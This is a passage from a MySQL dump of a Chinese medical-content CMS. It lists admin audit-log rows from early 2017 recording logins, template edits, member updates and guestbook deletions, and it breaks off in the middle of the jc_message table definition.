INSERT INTO `jc_log` VALUES ('97', '1', '1', '3', '2017-01-16 11:09:50', '127.0.0.1', '/admin/cms/channel/o_update.do', '修改栏目', 'id=75;name=新闻资讯');
INSERT INTO `jc_log` VALUES ('98', '1', '1', '3', '2017-01-16 11:10:19', '127.0.0.1', '/admin/cms/channel/o_update.do', '修改栏目', 'id=77;name=空中课堂');
INSERT INTO `jc_log` VALUES ('99', '1', '1', '3', '2017-01-16 11:10:34', '127.0.0.1', '/admin/cms/channel/o_update.do', '修改栏目', 'id=75;name=新闻资讯');
INSERT INTO `jc_log` VALUES ('100', '1', '1', '3', '2017-01-16 11:17:17', '127.0.0.1', '/admin/cms/channel/o_update.do', '修改栏目', 'id=77;name=空中课堂');
INSERT INTO `jc_log` VALUES ('101', '1', '1', '3', '2017-01-16 11:17:32', '127.0.0.1', '/admin/cms/channel/o_update.do', '修改栏目', 'id=75;name=新闻资讯');
INSERT INTO `jc_log` VALUES ('102', '1', null, '1', '2017-01-16 15:49:42', '127.0.0.1', '/admin/cms/login.do', 'login success', null);
INSERT INTO `jc_log` VALUES ('103', '1', null, '1', '2017-01-16 15:57:15', '127.0.0.1', '/admin/cms/login.do', 'login success', null);
INSERT INTO `jc_log` VALUES ('104', '1', null, '1', '2017-01-16 17:14:16', '127.0.0.1', '/admin/cms/login.do', 'login success', null);
INSERT INTO `jc_log` VALUES ('105', '1', '1', '3', '2017-01-16 17:15:10', '127.0.0.1', '/admin/cms/config/o_system_update.do', '修改系统设置', null);
INSERT INTO `jc_log` VALUES ('106', null, null, '2', '2017-01-16 17:24:42', '127.0.0.1', '/admin/cms/login.do', 'login failure', 'username=77219569@qq.com');
INSERT INTO `jc_log` VALUES ('107', '1', null, '1', '2017-01-16 17:24:49', '127.0.0.1', '/admin/cms/login.do', 'login success', null);
INSERT INTO `jc_log` VALUES ('108', '1', '1', '3', '2017-01-16 17:29:18', '127.0.0.1', '/admin/cms/config/o_login_update.do', '修改登录设置', null);
INSERT INTO `jc_log` VALUES ('109', '1', null, '1', '2017-01-16 17:40:21', '127.0.0.1', '/admin/cms/login.do', 'login success', null);
INSERT INTO `jc_log` VALUES ('110', '1', '1', '3', '2017-01-16 17:40:45', '127.0.0.1', '/admin/cms/config/o_login_update.do', '修改登录设置', null);
INSERT INTO `jc_log` VALUES ('111', '1', '1', '3', '2017-01-16 17:44:59', '127.0.0.1', '/admin/cms/config/o_login_update.do', '修改登录设置', null);
INSERT INTO `jc_log` VALUES ('112', '1', null, '1', '2017-01-17 09:07:57', '117.175.128.162', '/admin/cms/login.do', 'login success', null);
INSERT INTO `jc_log` VALUES ('113', '1', '1', '3', '2017-01-17 10:08:47', '117.175.128.162', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/content/pic.html');
INSERT INTO `jc_log` VALUES ('114', '1', '1', '3', '2017-01-17 15:09:08', '182.138.200.232', '/admin/cms/group/o_save.do', '增加会员组', 'id=3;name=vip会员');
INSERT INTO `jc_log` VALUES ('115', '1', '1', '3', '2017-01-17 15:09:25', '182.138.200.232', '/admin/cms/member/o_update.do', '更新会员', 'id=5;username=红山茶007');
INSERT INTO `jc_log` VALUES ('116', '1', '1', '3', '2017-01-17 15:13:33', '182.138.200.232', '/admin/cms/channel/o_save.do', '增加栏目', 'id=97;title=null');
INSERT INTO `jc_log` VALUES ('117', '1', '1', '3', '2017-01-17 15:14:53', '182.138.200.232', '/admin/cms/channel/o_delete.do', '删除栏目', 'id=97;title=null');
INSERT INTO `jc_log` VALUES ('118', '1', null, '1', '2017-01-17 15:37:56', '182.138.200.232', '/admin/cms/login.do', 'login success', null);
INSERT INTO `jc_log` VALUES ('119', '1', '1', '3', '2017-01-17 15:38:12', '182.138.200.232', '/admin/cms/member/o_update.do', '更新会员', 'id=6;username=彩虹医学编辑');
INSERT INTO `jc_log` VALUES ('120', '1', '1', '3', '2017-01-17 17:32:37', '117.175.128.162', '/admin/cms/resource/o_save.do', '保存资源', 'filename=tmppass.js');
INSERT INTO `jc_log` VALUES ('121', '1', '1', '3', '2017-01-17 17:35:51', '117.175.128.162', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/index/index.html');
INSERT INTO `jc_log` VALUES ('122', '1', '1', '3', '2017-01-17 17:36:44', '117.175.128.162', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/index/index.html');
INSERT INTO `jc_log` VALUES ('123', '1', '1', '3', '2017-01-17 17:37:23', '117.175.128.162', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/index/index.html');
INSERT INTO `jc_log` VALUES ('124', '1', '1', '3', '2017-01-17 17:40:00', '117.175.128.162', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/index/index.html');
INSERT INTO `jc_log` VALUES ('125', '1', '1', '3', '2017-01-17 17:43:16', '117.175.128.162', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/index/index.html');
INSERT INTO `jc_log` VALUES ('126', '1', '1', '3', '2017-01-17 17:45:55', '117.175.128.162', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/index/index.html');
INSERT INTO `jc_log` VALUES ('127', '1', '1', '3', '2017-01-17 17:46:10', '117.175.128.162', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/index/index.html');
INSERT INTO `jc_log` VALUES ('128', '1', '1', '3', '2017-01-17 17:46:33', '117.175.128.162', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/index/index.html');
INSERT INTO `jc_log` VALUES ('129', '1', '1', '3', '2017-01-17 17:49:05', '117.175.128.162', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/index/index.html');
INSERT INTO `jc_log` VALUES ('130', '1', '1', '3', '2017-01-17 17:50:06', '117.175.128.162', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/index/index.html');
INSERT INTO `jc_log` VALUES ('131', '1', '1', '3', '2017-01-17 17:50:43', '117.175.128.162', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/index/index.html');
INSERT INTO `jc_log` VALUES ('132', '1', '1', '3', '2017-01-17 17:51:33', '117.175.128.162', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/mobile/index/index.html');
INSERT INTO `jc_log` VALUES ('133', '1', '1', '3', '2017-01-17 17:52:17', '117.175.128.162', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/mobile/index/index.html');
INSERT INTO `jc_log` VALUES ('134', '1', '1', '3', '2017-01-17 17:52:26', '117.175.128.162', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/index/index.html');
INSERT INTO `jc_log` VALUES ('135', '1', '1', '3', '2017-01-17 17:52:57', '117.175.128.162', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/index/index.html');
INSERT INTO `jc_log` VALUES ('136', '1', '1', '3', '2017-01-17 17:53:09', '117.175.128.162', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/mobile/index/index.html');
INSERT INTO `jc_log` VALUES ('137', '1', null, '1', '2017-01-17 22:14:44', '101.207.227.67', '/admin/cms/login.do', 'login success', null);
INSERT INTO `jc_log` VALUES ('138', '1', '1', '3', '2017-01-17 22:35:13', '101.207.231.72', '/admin/cms/content/o_update.do', '修改文章', 'id=130;title=党中央推进民族工作创新发展纪实');
INSERT INTO `jc_log` VALUES ('139', '1', '1', '3', '2017-01-17 23:32:43', '101.207.227.67', '/admin/cms/member/o_update.do', '更新会员', 'id=6;username=彩虹医学编辑');
INSERT INTO `jc_log` VALUES ('140', '1', '1', '3', '2017-01-17 23:32:56', '101.207.227.0', '/admin/cms/member/o_update.do', '更新会员', 'id=5;username=红山茶007');
INSERT INTO `jc_log` VALUES ('141', '1', '1', '3', '2017-01-17 23:33:14', '101.207.227.0', '/admin/cms/group/o_delete.do', '删除会员组', 'id=3;name=vip会员');
INSERT INTO `jc_log` VALUES ('142', '1', '1', '3', '2017-01-17 23:45:04', '101.207.227.67', '/admin/cms/member/o_save.do', '增加会员', 'id=9;username=test');
INSERT INTO `jc_log` VALUES ('143', '1', '1', '3', '2017-01-17 23:45:53', '101.207.227.67', '/admin/cms/member/o_delete.do', '删除会员', 'id=9;username=test');
INSERT INTO `jc_log` VALUES ('144', '1', null, '1', '2017-01-18 00:52:09', '117.175.128.162', '/admin/cms/login.do', 'login success', null);
INSERT INTO `jc_log` VALUES ('145', '1', '1', '3', '2017-01-18 10:18:18', '117.173.132.144', '/admin/cms/config/o_system_update.do', '修改系统设置', null);
INSERT INTO `jc_log` VALUES ('146', '1', '1', '3', '2017-01-18 14:40:45', '117.173.132.144', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/alone/alone_about.html');
INSERT INTO `jc_log` VALUES ('147', '1', '1', '3', '2017-01-18 14:41:05', '117.173.132.144', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/mobile/alone/alone_about.html');
INSERT INTO `jc_log` VALUES ('148', '1', '1', '3', '2017-01-18 14:41:50', '117.173.132.144', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/mobile/alone/alone_about.html');
INSERT INTO `jc_log` VALUES ('149', '1', '1', '3', '2017-01-18 14:51:41', '117.173.132.144', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/mobile/alone/alone_about.html');
INSERT INTO `jc_log` VALUES ('150', '1', '1', '3', '2017-01-18 14:55:18', '117.173.132.144', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/mobile/alone/alone_about.html');
INSERT INTO `jc_log` VALUES ('151', '1', '1', '3', '2017-01-18 15:02:22', '117.173.132.144', '/admin/cms/config/o_system_update.do', '修改系统设置', null);
INSERT INTO `jc_log` VALUES ('152', '1', null, '1', '2017-01-19 08:43:09', '117.175.132.60', '/admin/cms/login.do', 'login success', null);
INSERT INTO `jc_log` VALUES ('153', '1', '1', '3', '2017-01-19 18:24:06', '117.175.132.60', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/mobile/include/header.html');
INSERT INTO `jc_log` VALUES ('154', '1', '1', '3', '2017-01-19 18:25:12', '117.175.132.60', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/mobile/index/index.html');
INSERT INTO `jc_log` VALUES ('155', '1', null, '1', '2017-01-22 01:59:46', '101.207.227.70', '/admin/cms/login.do', 'login success', null);
INSERT INTO `jc_log` VALUES ('156', '1', '1', '3', '2017-01-22 02:00:01', '101.207.231.75', '/admin/cms/config/o_member_update.do', '修改会员设置', null);
INSERT INTO `jc_log` VALUES ('157', '1', '1', '3', '2017-01-22 02:01:07', '101.207.227.1', '/admin/cms/config/o_member_update.do', '修改会员设置', null);
INSERT INTO `jc_log` VALUES ('158', '1', '1', '3', '2017-01-22 02:01:30', '101.207.231.75', '/admin/cms/config/o_member_update.do', '修改会员设置', null);
INSERT INTO `jc_log` VALUES ('159', '1', '1', '3', '2017-01-22 02:04:42', '101.207.231.75', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/member/register.html');
INSERT INTO `jc_log` VALUES ('160', '1', '1', '3', '2017-01-22 02:05:04', '101.207.231.75', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/mobile/member/register.html');
INSERT INTO `jc_log` VALUES ('161', '1', '1', '3', '2017-01-24 20:56:01', '101.207.227.69', '/admin/cms/friendlink/o_update.do', '修改友情链接', 'id=1;name=丁香园');
INSERT INTO `jc_log` VALUES ('162', '1', '1', '3', '2017-01-24 20:56:32', '101.207.227.69', '/admin/cms/friendlink/o_update.do', '修改友情链接', 'id=2;name=挂号网');
INSERT INTO `jc_log` VALUES ('163', '1', '1', '3', '2017-01-24 20:56:43', '101.207.227.69', '/admin/cms/friendlink/o_update.do', '修改友情链接', 'id=1;name=丁香园');
INSERT INTO `jc_log` VALUES ('164', '1', null, '1', '2017-01-24 23:59:33', '101.207.227.2', '/admin/cms/login.do', 'login success', null);
INSERT INTO `jc_log` VALUES ('165', '1', '1', '3', '2017-01-25 00:00:57', '101.207.227.64', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/member/login_input.html');
INSERT INTO `jc_log` VALUES ('166', '1', null, '1', '2017-01-25 00:12:18', '101.207.227.64', '/admin/cms/login.do', 'login success', null);
INSERT INTO `jc_log` VALUES ('167', '1', '1', '3', '2017-01-25 00:12:37', '101.207.227.64', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/member/login_input.html');
INSERT INTO `jc_log` VALUES ('168', null, null, '2', '2017-01-25 00:13:40', '101.207.227.69', '/admin/cms/login.do', 'login failure', 'username=admin');
INSERT INTO `jc_log` VALUES ('169', '1', null, '1', '2017-01-25 00:13:47', '101.207.227.69', '/admin/cms/login.do', 'login success', null);
INSERT INTO `jc_log` VALUES ('170', '1', '1', '3', '2017-01-25 00:14:09', '101.207.227.2', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/member/login_input.html');
INSERT INTO `jc_log` VALUES ('171', '1', null, '1', '2017-01-25 09:04:32', '117.174.29.135', '/admin/cms/login.do', 'login success', null);
INSERT INTO `jc_log` VALUES ('172', '1', '1', '3', '2017-01-25 09:06:59', '117.174.29.135', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/member/register.html');
INSERT INTO `jc_log` VALUES ('173', '1', null, '1', '2017-01-31 11:10:54', '45.76.105.95', '/admin/cms/login.do', 'login success', null);
INSERT INTO `jc_log` VALUES ('174', '1', '1', '3', '2017-01-31 11:13:41', '45.76.105.95', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/member/member_footer.html');
INSERT INTO `jc_log` VALUES ('175', '1', '1', '3', '2017-02-01 00:12:08', '101.207.227.70', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/index/index.html');
INSERT INTO `jc_log` VALUES ('176', '1', '1', '3', '2017-02-01 00:12:23', '101.207.227.70', '/admin/cms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/mobile/index/index.html');
INSERT INTO `jc_log` VALUES ('177', '1', '1', '3', '2017-02-01 12:19:47', '127.0.0.1', '/admin/cms/guestbook/o_save.do', '增加留言', 'id=9;title=特二食堂');
INSERT INTO `jc_log` VALUES ('178', '1', '1', '3', '2017-02-01 12:20:35', '127.0.0.1', '/admin/cms/guestbook/o_update.do', '修改留言', 'id=9;title=特二食堂');
INSERT INTO `jc_log` VALUES ('179', '1', '1', '3', '2017-02-01 12:21:33', '127.0.0.1', '/admin/cms/guestbook/o_delete.do', '删除留言', 'id=6;title=请问在内容中上传视频的限制是多大，能不能自己设置设置视频的大小	');
INSERT INTO `jc_log` VALUES ('180', '1', '1', '3', '2017-02-01 12:21:33', '127.0.0.1', '/admin/cms/guestbook/o_delete.do', '删除留言', 'id=5;title=网店和论坛的用户管理和caihongyixue 可以统一起来吗？	');
INSERT INTO `jc_log` VALUES ('181', '1', '1', '3', '2017-02-01 12:21:33', '127.0.0.1', '/admin/cms/guestbook/o_delete.do', '删除留言', 'id=4;title=怎么在页面首页放一个视频之后我点击的时候就可以看？');
INSERT INTO `jc_log` VALUES ('182', '1', '1', '3', '2017-02-01 12:21:34', '127.0.0.1', '/admin/cms/guestbook/o_delete.do', '删除留言', 'id=3;title=新版caihongyixue v8的改动很大，希望做得更好，持续关注中。');
INSERT INTO `jc_log` VALUES ('183', '1', '1', '3', '2017-02-01 12:21:39', '127.0.0.1', '/admin/cms/guestbook/o_delete.do', '删除留言', 'id=8;title=你好');
INSERT INTO `jc_log` VALUES ('184', '1', '1', '3', '2017-02-01 12:21:39', '127.0.0.1', '/admin/cms/guestbook/o_delete.do', '删除留言', 'id=7;title=稀里糊涂');
INSERT INTO `jc_log` VALUES ('185', '1', '1', '3', '2017-02-01 13:36:48', '127.0.0.1', '/admin/cms/acquisition/o_delete_history.do', '删除采集历史', 'id=9;name=六十种民间“非遗”亮相郑州室内春集 观者如潮');
INSERT INTO `jc_log` VALUES ('186', '1', '1', '3', '2017-02-01 13:36:48', '127.0.0.1', '/admin/cms/acquisition/o_delete_history.do', '删除采集历史', 'id=8;name=巴西２０１６年失业率达１１．５％');
INSERT INTO `jc_log` VALUES ('187', '1', '1', '3', '2017-02-01 13:36:48', '127.0.0.1', '/admin/cms/acquisition/o_delete_history.do', '删除采集历史', 'id=7;name=罗马尼亚政府通过修改刑法紧急政令');
INSERT INTO `jc_log` VALUES ('188', '1', '1', '3', '2017-02-01 13:36:48', '127.0.0.1', '/admin/cms/acquisition/o_delete_history.do', '删除采集历史', 'id=6;name=塞尔维亚和希腊计划改造升级连接两国的铁路');
INSERT INTO `jc_log` VALUES ('189', '1', '1', '3', '2017-02-01 13:36:48', '127.0.0.1', '/admin/cms/acquisition/o_delete_history.do', '删除采集历史', 'id=5;name=“开门办春晚”让春晚大餐更“可口”');
INSERT INTO `jc_log` VALUES ('190', '1', '1', '3', '2017-02-01 13:36:48', '127.0.0.1', '/admin/cms/acquisition/o_delete_history.do', '删除采集历史', 'id=4;name=联合国特使说叙利亚问题日内瓦和谈推迟至２月２０日举行');
INSERT INTO `jc_log` VALUES ('191', '1', '1', '3', '2017-02-01 13:36:48', '127.0.0.1', '/admin/cms/acquisition/o_delete_history.do', '删除采集历史', 'id=3;name=5分钟剁好馅？10分钟发好面？现学现用！家家必备神技能（点开本文沾财运）');
INSERT INTO `jc_log` VALUES ('192', '1', '1', '3', '2017-02-01 13:36:48', '127.0.0.1', '/admin/cms/acquisition/o_delete_history.do', '删除采集历史', 'id=2;name=快来接财神了！正月初五的正确打开方式全在这，全年都能“鸡”有钱！');
INSERT INTO `jc_log` VALUES ('193', '1', '1', '3', '2017-02-01 13:36:48', '127.0.0.1', '/admin/cms/acquisition/o_delete_history.do', '删除采集历史', 'id=1;name=新西兰将于９月２３日举行议会选举');
INSERT INTO `jc_log` VALUES ('194', null, null, '2', '2017-02-01 18:44:56', '127.0.0.1', '/admin/cms/login.do', 'login failure', 'username=15588882223');
INSERT INTO `jc_log` VALUES ('195', '1', null, '1', '2017-02-01 18:45:04', '127.0.0.1', '/admin/cms/login.do', 'login success', null);
INSERT INTO `jc_log` VALUES ('196', '1', '1', '3', '2017-02-01 18:46:27', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=28;username=caihong6');
INSERT INTO `jc_log` VALUES ('197', '1', '1', '3', '2017-02-01 19:16:38', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=28;username=caihong6');
INSERT INTO `jc_log` VALUES ('198', '1', '1', '3', '2017-02-01 19:18:03', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=28;username=caihong6');
INSERT INTO `jc_log` VALUES ('199', '1', '1', '3', '2017-02-01 19:18:27', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=28;username=caihong6');
INSERT INTO `jc_log` VALUES ('200', '1', '1', '3', '2017-02-01 19:19:32', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=27;username=caihong4');
INSERT INTO `jc_log` VALUES ('201', '1', '1', '3', '2017-02-01 19:31:06', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=28;username=caihong6');
INSERT INTO `jc_log` VALUES ('202', '1', '1', '3', '2017-02-01 19:33:51', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=28;username=caihong6');
INSERT INTO `jc_log` VALUES ('203', '1', '1', '3', '2017-02-01 19:35:15', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=28;username=caihong6');
INSERT INTO `jc_log` VALUES ('204', '1', '1', '3', '2017-02-01 19:36:24', '127.0.0.1', '/admin/cms/member/o_save.do', '增加会员', 'id=29;username=test');
INSERT INTO `jc_log` VALUES ('205', '1', '1', '3', '2017-02-01 21:04:29', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=29;username=test');
INSERT INTO `jc_log` VALUES ('206', '1', '1', '3', '2017-02-01 21:04:53', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=29;username=test');
INSERT INTO `jc_log` VALUES ('207', '1', '1', '3', '2017-02-01 21:08:09', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=29;username=test');
INSERT INTO `jc_log` VALUES ('208', '1', '1', '3', '2017-02-01 21:25:12', '127.0.0.1', '/admin/cms/content/o_update.do', '修改文章', 'id=130;title=党中央推进民族工作创新发展纪实');
INSERT INTO `jc_log` VALUES ('209', '1', '1', '3', '2017-02-01 21:27:28', '127.0.0.1', '/admin/cms/content/o_update.do', '修改文章', 'id=130;title=党中央推进民族工作创新发展纪实');
INSERT INTO `jc_log` VALUES ('210', '1', '1', '3', '2017-02-02 00:28:31', '127.0.0.1', '/admin/cms/department/o_update.do', '修改部门', 'id=1;name=四川大学华西医院');
INSERT INTO `jc_log` VALUES ('211', '1', '1', '3', '2017-02-02 00:28:48', '127.0.0.1', '/admin/cms/department/o_save.do', '增加部门', 'id=2;name=北京协和医院');
INSERT INTO `jc_log` VALUES ('212', '1', '1', '3', '2017-02-02 00:31:02', '127.0.0.1', '/admin/cms/department/o_save.do', '增加部门', 'id=3;name=病理科');
INSERT INTO `jc_log` VALUES ('213', '1', '1', '3', '2017-02-02 00:32:10', '127.0.0.1', '/admin/cms/department/o_update.do', '修改部门', 'id=1;name=四川大学华西医院');
INSERT INTO `jc_log` VALUES ('214', '1', '1', '3', '2017-02-02 00:32:25', '127.0.0.1', '/admin/cms/department/o_save.do', '增加部门', 'id=4;name=病理科');
INSERT INTO `jc_log` VALUES ('215', '1', '1', '3', '2017-02-02 00:33:03', '127.0.0.1', '/admin/cms/department/o_save.do', '增加部门', 'id=5;name=病理科');
INSERT INTO `jc_log` VALUES ('216', '1', '1', '3', '2017-02-02 00:33:58', '127.0.0.1', '/admin/cms/department/o_update.do', '修改部门', 'id=5;name=放射科');
INSERT INTO `jc_log` VALUES ('217', '1', '1', '3', '2017-02-02 00:45:37', '127.0.0.1', '/admin/cms/department/o_save.do', '增加部门', 'id=6;name=其他');
INSERT INTO `jc_log` VALUES ('218', '1', '1', '3', '2017-02-02 00:48:42', '127.0.0.1', '/admin/cms/department/o_update.do', '修改部门', 'id=6;name=其他医院');
INSERT INTO `jc_log` VALUES ('219', '1', '1', '3', '2017-02-02 18:16:46', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=29;username=test');
INSERT INTO `jc_log` VALUES ('220', '1', '1', '3', '2017-02-02 18:17:37', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=29;username=test');
INSERT INTO `jc_log` VALUES ('221', '1', '1', '3', '2017-02-02 18:17:55', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=29;username=test');
INSERT INTO `jc_log` VALUES ('222', '1', '1', '3', '2017-02-02 18:21:19', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=29;username=test');
INSERT INTO `jc_log` VALUES ('223', '1', '1', '3', '2017-02-02 19:44:55', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=29;username=test');
INSERT INTO `jc_log` VALUES ('224', '1', '1', '3', '2017-02-02 19:47:18', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=29;username=test');
INSERT INTO `jc_log` VALUES ('225', '1', '1', '3', '2017-02-02 19:49:21', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=29;username=test');
INSERT INTO `jc_log` VALUES ('226', '1', '1', '3', '2017-02-02 19:50:19', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=29;username=test');
INSERT INTO `jc_log` VALUES ('227', '1', '1', '3', '2017-02-02 20:41:11', '127.0.0.1', '/admin/cms/dictionary/o_update.do', '修改字典值', 'id=8;name=肿瘤');
INSERT INTO `jc_log` VALUES ('228', '1', '1', '3', '2017-02-02 23:42:23', '127.0.0.1', '/admin/cms/member/o_save.do', '增加会员', 'id=30;username=test1');
INSERT INTO `jc_log` VALUES ('229', '1', '1', '3', '2017-02-02 23:43:02', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=30;username=test1');
INSERT INTO `jc_log` VALUES ('230', '1', '1', '3', '2017-02-02 23:49:43', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=30;username=test1');
INSERT INTO `jc_log` VALUES ('231', '1', '1', '3', '2017-02-02 23:52:47', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=30;username=test1');
INSERT INTO `jc_log` VALUES ('232', '1', '1', '3', '2017-02-03 00:03:15', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=30;username=test1');
INSERT INTO `jc_log` VALUES ('233', '1', '1', '3', '2017-02-03 00:06:52', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=30;username=test1');
INSERT INTO `jc_log` VALUES ('234', '1', '1', '3', '2017-02-03 00:07:38', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=30;username=test1');
INSERT INTO `jc_log` VALUES ('235', '1', '1', '3', '2017-02-03 00:47:08', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=27;username=caihong4');
INSERT INTO `jc_log` VALUES ('236', '1', '1', '3', '2017-02-04 18:22:47', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=30;username=test1');
INSERT INTO `jc_log` VALUES ('237', '1', '1', '3', '2017-02-04 18:24:09', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=29;username=test');
INSERT INTO `jc_log` VALUES ('238', '1', '1', '3', '2017-02-04 18:24:49', '127.0.0.1', '/admin/cms/channel/o_update.do', '修改栏目', 'id=76;name=专家团队');
INSERT INTO `jc_log` VALUES ('239', '1', '1', '3', '2017-02-04 18:26:53', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=30;username=test1');
INSERT INTO `jc_log` VALUES ('240', '1', '1', '3', '2017-02-04 18:27:12', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=29;username=test');
INSERT INTO `jc_log` VALUES ('241', '1', '1', '3', '2017-02-04 18:27:28', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=28;username=caihong6');
INSERT INTO `jc_log` VALUES ('242', '1', '1', '3', '2017-02-04 18:27:59', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=27;username=caihong4');
INSERT INTO `jc_log` VALUES ('243', '1', '1', '3', '2017-02-04 18:28:15', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=27;username=caihong4');
INSERT INTO `jc_log` VALUES ('244', '1', '1', '3', '2017-02-04 18:28:36', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=2;username=caihong');
INSERT INTO `jc_log` VALUES ('245', '1', '1', '3', '2017-02-04 18:31:13', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=23;username=caihong5');
INSERT INTO `jc_log` VALUES ('246', '1', '1', '3', '2017-02-04 18:44:50', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=14;username=彩虹');
INSERT INTO `jc_log` VALUES ('247', '1', '1', '3', '2017-02-04 18:51:24', '127.0.0.1', '/admin/cms/channel/o_update.do', '修改栏目', 'id=76;name=专家团队');
INSERT INTO `jc_log` VALUES ('248', '1', '1', '3', '2017-02-05 01:36:52', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=2;username=caihong');
INSERT INTO `jc_log` VALUES ('249', '1', '1', '3', '2017-02-05 03:08:07', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=12;username=彩虹妹妹');
INSERT INTO `jc_log` VALUES ('250', '1', '1', '3', '2017-02-05 03:08:28', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=2;username=caihong');
INSERT INTO `jc_log` VALUES ('251', '1', '1', '3', '2017-02-05 03:08:44', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=2;username=caihong');
INSERT INTO `jc_log` VALUES ('252', '1', '1', '3', '2017-02-05 03:18:50', '127.0.0.1', '/admin/cms/member/o_update.do', '更新会员', 'id=2;username=caihong');

-- ----------------------------
-- Table structure for jc_message
-- ----------------------------
DROP TABLE IF EXISTS `jc_message`;
CREATE TABLE `jc_message` (
  `msg_id` int(11) NOT NULL AUTO_INCREMENT COMMENT '消息id',
  `msg_title` varchar(255) NOT NULL DEFAULT '' COMMENT '标题',
  `msg_content` longtext COMMENT '站内信息内容',
  `send_time` timestamp NULL DEFAULT NULL COMMENT '发送时间',
  `msg_send_user` int(11) NOT NULL DEFAULT '1' COMMENT '发信息人',
  `msg_receiver_user` int(11) NOT NULL DEFAULT '0' COMMENT '接收人',
